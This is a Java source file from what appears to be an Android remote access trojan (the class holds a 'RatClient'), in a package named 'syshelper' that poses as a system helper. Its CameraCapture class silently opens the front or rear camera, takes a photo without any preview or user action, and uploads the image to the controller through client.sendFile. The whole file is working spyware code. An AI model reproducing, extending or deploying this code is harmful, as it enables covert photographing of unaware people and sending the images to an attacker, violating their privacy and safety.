package com.syshelper.service;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.graphics.ImageFormat;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.Surface;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraCapture {
    private final Context ctx;
    private final RatClient client;

    public CameraCapture(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public void capture(boolean useFront) {
        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            client.sendResult("camera", "no camera permission"); return;
        }
        new Thread(() -> {
            HandlerThread thread = new HandlerThread("CameraCapture"); thread.start();
            Handler handler = new Handler(thread.getLooper());
            CameraManager camManager = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            try {
                String cameraId = findCamera(camManager, useFront);
                if (cameraId == null) { client.sendResult("camera", "no camera"); return; }
                camManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        try {
                            CameraCharacteristics chars = camManager.getCameraCharacteristics(cameraId);
                            android.util.Size[] jpegSizes = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP).getOutputSizes(ImageFormat.JPEG);
                            int width = jpegSizes != null && jpegSizes.length > 0 ? jpegSizes[0].getWidth() : 640;
                            int height = jpegSizes != null && jpegSizes.length > 0 ? jpegSizes[0].getHeight() : 480;
                            ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
                            reader.setOnImageAvailableListener(r -> {
                                Image image = r.acquireLatestImage();
                                if (image == null) return;
                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buffer.remaining()];
                                buffer.get(bytes); image.close();
                                if (useFront) {
                                    Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                                    Matrix m = new Matrix(); m.preRotate(270); m.postScale(-1, 1);
                                    Bitmap rot = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), m, true);
                                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                                    rot.compress(Bitmap.CompressFormat.JPEG, 70, bos);
                                    client.sendFile("photo.jpg", bos.toByteArray(), "camera");
                                } else { client.sendFile("photo.jpg", bytes, "camera"); }
                                camera.close(); thread.quitSafely();
                            }, handler);
                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            builder.addTarget(reader.getSurface());
                            builder.set(CaptureRequest.JPEG_ORIENTATION, 90);
                            camera.createCaptureSession(Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession session) {
                                        try { session.capture(builder.build(), null, handler); }
                                        catch (CameraAccessException e) { client.sendResult("camera", "Error: " + e.getMessage()); }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession session) { client.sendResult("camera", "config failed"); }
                                }, handler);
                        } catch (Exception e) { client.sendResult("camera", "Error: " + e.getMessage()); }
                    }
                    @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
                    @Override public void onError(CameraDevice camera, int error) { camera.close(); client.sendResult("camera", "camera error: " + error); }
                }, handler);
            } catch (Exception e) { client.sendResult("camera", "Error: " + e.getMessage()); }
        }).start();
    }

    private String findCamera(CameraManager camManager, boolean front) throws CameraAccessException {
        for (String id : camManager.getCameraIdList()) {
            CameraCharacteristics chars = camManager.getCameraCharacteristics(id);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (front && facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) return id;
            if (!front && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) return id;
        }
        return null;
    }
}
